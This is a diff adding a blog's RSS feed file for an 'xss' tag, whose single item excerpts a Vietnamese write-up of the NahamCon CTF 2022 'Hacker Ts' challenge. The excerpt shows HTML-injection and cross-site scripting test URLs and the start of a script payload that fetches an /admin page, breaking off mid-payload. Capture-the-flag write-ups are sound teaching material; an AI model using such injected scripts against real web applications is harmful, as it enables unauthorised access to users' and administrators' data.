@@ -1,0 +1,23 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>d@rkmod3</title>
+    <link>/tags/xss/</link>
+    <description></description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Mon, 02 May 2022 00:00:00 +0000</lastBuildDate><atom:link href="/tags/xss/index.xml" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Nahamcon CTF2022</title>
+        <link>/posts/nahamconctf_2022/</link>
+        <pubDate>Mon, 02 May 2022 00:00:00 +0000</pubDate>
+        
+        <guid>/posts/nahamconctf_2022/</guid>
+        <description>Hacker Ts (hard) Bài này cho chúng ta input text và sử dụng wkhtmltoimage để generate ra hình ảnh.
+Thử với htmlinjection:
+/exploit?text=&amp;lt;del%20style=&amp;#34;color:red&amp;#34;&amp;gt;test&amp;lt;/del&amp;gt;&amp;amp;color=%2324d600 Thử xss 1 chút:
+/exploit?text=&amp;lt;del%20id=&amp;#34;test&amp;#34; style=&amp;#34;color:red&amp;#34;&amp;gt;test&amp;lt;/del&amp;gt;&amp;lt;script&amp;gt;test.innerText=&amp;#34;changethistext&amp;#34;&amp;lt;/script&amp;gt;&amp;amp;color=%2324d600 Yah, chữ test đã chuyển thành changethistext, chứng tỏ thẻ &amp;lt;script&amp;gt; hoạt động. Nice!!!, như vậy ta ta chỉ cần lấy dữ liệu từ /admin là có được flag. Payload
+&amp;lt;script&amp;gt;var result = document.createElement(&amp;#34;p&amp;#34;);var data = new XMLHttpRequest();data.</description>
+      </item>
+    
+  </channel>
+</rss>
